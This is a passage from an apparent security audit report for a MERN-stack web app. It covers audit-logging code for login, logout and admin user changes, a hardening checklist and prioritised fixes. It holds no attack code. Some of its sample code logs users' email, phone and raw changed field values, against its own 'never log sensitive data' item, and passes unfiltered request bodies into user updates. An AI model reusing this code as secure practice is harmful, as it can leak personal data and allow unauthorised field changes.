    await auditLogger.logAuthentication({
      event: 'LOGIN_USER_NOT_FOUND',
      identifier: loginId,
      ip: req.ip,
      timestamp: new Date()
    });
    
    return next(new ErrorResponse('Invalid credentials', 401));
  }

  const isMatch = await user.comparePassword(password);
  if (!isMatch) {
    await auditLogger.logAuthentication({
      event: 'LOGIN_FAILED_PASSWORD',
      userId: user._id,
      ip: req.ip,
      timestamp: new Date()
    });
    
    return next(new ErrorResponse('Invalid credentials', 401));
  }

  // Successful login
  await auditLogger.logAuthentication({
    event: 'LOGIN_SUCCESS',
    userId: user._id,
    email: user.email,
    phone: user.phone,
    role: user.role,
    ip: req.ip,
    userAgent: req.get('user-agent'),
    timestamp: new Date()
  });

  const token = signToken(user);
  
  res.status(200).json({
    success: true,
    message: 'Logged in',
    data: { token, user: sanitizeUser(user) }
  });
});

exports.logout = asyncHandler(async (req, res, next) => {
  await auditLogger.logAuthentication({
    event: 'LOGOUT',
    userId: req.user.id,
    timestamp: new Date()
  });

  res.status(200).json({
    success: true,
    message: 'Logged out successfully'
  });
});
```

Add audit logging to data modifications:

```javascript
// backend/controllers/adminController.js
exports.deleteUser = asyncHandler(async (req, res, next) => {
  const user = await User.findByIdAndDelete(req.params.id);
  
  if (!user) {
    return next(new ErrorResponse('User not found', 404));
  }

  await auditLogger.logDataModification({
    event: 'USER_DELETED',
    adminId: req.user.id,
    userId: user._id,
    userEmail: user.email,
    userRole: user.role,
    timestamp: new Date()
  });

  res.status(200).json({
    success: true,
    message: 'User deleted',
    data: {}
  });
});

exports.updateUser = asyncHandler(async (req, res, next) => {
  const originalUser = await User.findById(req.params.id);
  
  const user = await User.findByIdAndUpdate(req.params.id, req.body, {
    new: true,
    runValidators: true
  });

  if (!user) {
    return next(new ErrorResponse('User not found', 404));
  }

  // Log changed fields
  const changedFields = {};
  for (const key in req.body) {
    if (originalUser[key] !== req.body[key]) {
      changedFields[key] = {
        from: originalUser[key],
        to: req.body[key]
      };
    }
  }

  await auditLogger.logDataModification({
    event: 'USER_UPDATED',
    adminId: req.user.id,
    userId: user._id,
    changedFields,
    timestamp: new Date()
  });

  res.status(200).json({
    success: true,
    message: 'User updated',
    data: user
  });
});
```

Add audit logging middleware:

```javascript
// backend/middlewares/auditMiddleware.js
const auditLogger = require('../utils/auditLogger');

module.exports = async (req, res, next) => {
  const originalSend = res.send;

  res.send = function(data) {
    // Log failed authorization attempts
    if (res.statusCode === 403) {
      auditLogger.logAuthorization({
        event: 'UNAUTHORIZED_ACCESS_ATTEMPT',
        userId: req.user?.id,
        path: req.path,
        method: req.method,
        ip: req.ip,
        timestamp: new Date()
      });
    }

    // Log suspicious activity (repeated errors from same IP)
    if (res.statusCode >= 400) {
      auditLogger.logSecurityEvent({
        event: 'HTTP_ERROR',
        status: res.statusCode,
        path: req.path,
        method: req.method,
        ip: req.ip,
        userId: req.user?.id,
        timestamp: new Date()
      });
    }

    return originalSend.call(this, data);
  };

  next();
};
```

**Best Practice Recommendation:**
✅ Log all authentication attempts (success and failure)  
✅ Log all authorization failures  
✅ Log data modifications with before/after values  
✅ Log admin actions separately  
✅ Implement centralized logging (ELK stack, Datadog, etc.)  
✅ Set retention policies (keep logs for 90+ days)  
✅ Alert on suspicious patterns

---

---

## Production Security Hardening Checklist

### 🔐 Authentication & Session Management
- [x] ✅ Replace localStorage tokens with HttpOnly + Secure cookies
- [ ] Implement multi-factor authentication (MFA/2FA)
- [ ] Add login attempt monitoring and account lockout
- [ ] Implement token rotation and refresh token mechanism
- [ ] Add session timeout (15-30 minutes of inactivity)
- [ ] Implement "remember me" with secure token
- [ ] Add device fingerprinting/tracking
- [ ] Require password change on first login
- [ ] Implement passwordless authentication (Magic links, Passkeys)
- [ ] Add biometric authentication support

### 🛡️ API Security
- [ ] Install and configure Helmet.js for security headers
- [ ] Implement rate limiting (express-rate-limit)
- [ ] Add CSRF protection with tokens
- [ ] Validate all ObjectIds before database queries
- [ ] Implement request size limits (100KB max)
- [ ] Add input sanitization (mongoSanitize)
- [ ] Create API versioning strategy
- [ ] Implement API key rotation for integrations
- [ ] Add request signing capability for sensitive operations
- [ ] Implement webhook signature verification

### 🔒 Data Protection
- [ ] Encrypt sensitive data at rest
- [ ] Implement database encryption
- [ ] Hash passwords with bcrypt (10+ salt rounds)
- [ ] Never log sensitive data (passwords, tokens, SSN)
- [ ] Implement PII masking in logs
- [ ] Add data retention and deletion policies
- [ ] Implement field-level encryption for sensitive fields
- [ ] Add encryption for data in transit (TLS 1.2+)
- [ ] Implement secure key management (AWS Secrets Manager, Vault)
- [ ] Regular security audits and penetration testing

### 📝 Input Validation & Output Encoding
- [ ] Validate all user input server-side
- [ ] Use strict password requirements (12+ chars, complexity)
- [ ] Implement email validation with verification
- [ ] Validate phone numbers with libphonenumber
- [ ] Sanitize HTML/script content
- [ ] Implement Content Security Policy (CSP)
- [ ] Encode output appropriately (HTML, URL, JavaScript)
- [ ] Implement input length limits
- [ ] Use parameterized queries (Mongoose-native)
- [ ] Whitelist acceptable characters

### 🚫 Error Handling & Logging
- [ ] Remove stack traces from production errors
- [ ] Implement error ID system for user support
- [ ] Set up centralized logging (Sentry, LogRocket)
- [ ] Log all security events (auth, authz, data changes)
- [ ] Implement log retention policies (90+ days)
- [ ] Set up real-time alerting for security events
- [ ] Implement request/response logging
- [ ] Add performance monitoring (New Relic, Datadog)
- [ ] Implement audit logging for compliance
- [ ] Regular log review and analysis

### ⚙️ Infrastructure & Deployment
- [ ] Use HTTPS/TLS for all communication
- [ ] Configure HSTS header (1 year, includeSubDomains)
- [ ] Use environment variables for sensitive config
- [ ] Implement database backup and recovery
- [ ] Set up disaster recovery plan
- [ ] Use WAF (Web Application Firewall)
- [ ] Implement DDoS protection
- [ ] Regular security patching and updates
- [ ] Use container security scanning
- [ ] Implement infrastructure as code with security checks

### 🔍 Third-Party & Dependency Management
- [ ] Audit all dependencies for vulnerabilities
- [ ] Implement automatic dependency updates
- [ ] Use npm audit regularly
- [ ] Pin exact versions in production
- [ ] Remove unused dependencies
- [ ] Implement supply chain security measures
- [ ] Regular security patching schedule
- [ ] Use private registry for internal packages
- [ ] Implement Software Bill of Materials (SBOM)
- [ ] Vendor security assessment process

### 👥 Access Control
- [ ] Implement role-based access control (RBAC)
- [ ] Principle of least privilege
- [ ] Separate authentication and authorization
- [ ] Implement ownership checks for resources
- [ ] Default deny access, explicit allow
- [ ] Admin elevation audit logging
- [ ] Implement time-based access restrictions
- [ ] IP-based access controls where applicable
- [ ] Implement API key rotation
- [ ] Regular access review and cleanup

### 🔄 Testing & Quality
- [ ] Security-focused unit tests
- [ ] Integration tests with security scenarios
- [ ] OWASP Top 10 penetration testing
- [ ] Automated dependency vulnerability scanning
- [ ] Regular code security reviews
- [ ] Static Application Security Testing (SAST)
- [ ] Dynamic Application Security Testing (DAST)
- [ ] Load and stress testing
- [ ] Chaos engineering tests
- [ ] Security regression testing

### 📊 Monitoring & Incident Response
- [ ] Set up security monitoring dashboard
- [ ] Real-time alerting for anomalies
- [ ] Incident response plan and team
- [ ] Regular incident response drills
- [ ] Post-incident analysis process
- [ ] Security event correlation
- [ ] Threat intelligence integration
- [ ] Regular security vulnerability scans
- [ ] Honeypot implementation for attack detection
- [ ] Security metrics and KPI tracking

### 📋 Compliance & Documentation
- [ ] GDPR compliance documentation
- [ ] Privacy policy and terms of service
- [ ] Data processing agreements
- [ ] Security policy documentation
- [ ] Incident response documentation
- [ ] Security architecture documentation
- [ ] Regular risk assessments
- [ ] Compliance audit schedule
- [ ] Data subject rights procedures
- [ ] Third-party risk assessments

### 🧪 Security Hardening - Frontend
- [ ] Remove all `dangerouslySetInnerHTML` usage
- [ ] Implement Content Security Policy
- [ ] Remove console output in production
- [ ] Sanitize all user input before display
- [ ] Remove sensitive data from error messages
- [ ] Implement authentication state persistence securely
- [ ] Add iframe sandboxing where needed
- [ ] Implement subresource integrity for external scripts
- [ ] Remove debug endpoints from production
- [ ] Regular security header validation

### 🔐 Secrets Management
- [ ] Rotate all API keys and secrets
- [ ] Use environment variables for secrets
- [ ] Never commit secrets to version control
- [ ] Implement secret scanning in CI/CD
- [ ] Use a secrets management tool (AWS Secrets Manager, HashiCorp Vault)
- [ ] Regular secret rotation schedule
- [ ] Access control for secrets
- [ ] Audit secret access logs
- [ ] Implement secret versioning
- [ ] Emergency secret rotation procedures

---

## Summary of Critical Fixes (Priority Order)

### Immediate (This Week)
1. **Move JWT to HttpOnly cookies** - Prevents XSS token theft
2. **Add rate limiting** - Prevents brute force attacks
3. **Implement CSRF protection** - Prevents account hijacking
4. **Add Helmet.js** - Provides essential security headers
5. **Fix weak password requirements** - Enforce 12+ characters

### Short-term (This Month)
6. **Implement audit logging** - For compliance and debugging
7. **Add request validation** - Prevent NoSQL injection
8. **Secure password reset** - Prevent account takeover
9. **Fix CORS configuration** - Prevent unauthorized API access
10. **Add CSP headers** - Prevent inline script execution

### Medium-term (Next Quarter)
11. Implement MFA for admin accounts
12. Add comprehensive security testing (SAST/DAST)
13. Implement database encryption
14. Set up WAF and DDoS protection
15. Regular penetration testing

---

## Recommended Reading & Resources

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [MongoDB Security Checklist](https://docs.mongodb.com/manual/security/security-checklist/)
- [React Security Best Practices](https://github.com/goldbergyoni/javascript-testing-best-practices)

---

**Report Status:** 🔴 **CRITICAL** - Production deployment not recommended until vulnerabilities are addressed.

**Next Steps:**
1. Use this report to prioritize fixes
2. Implement fixes in priority order
3. Conduct security testing after each fix
4. Request security review before production deployment
5. Set up continuous security monitoring

---

*This audit was conducted with focus on MERN Stack vulnerabilities affecting production SaaS applications.*
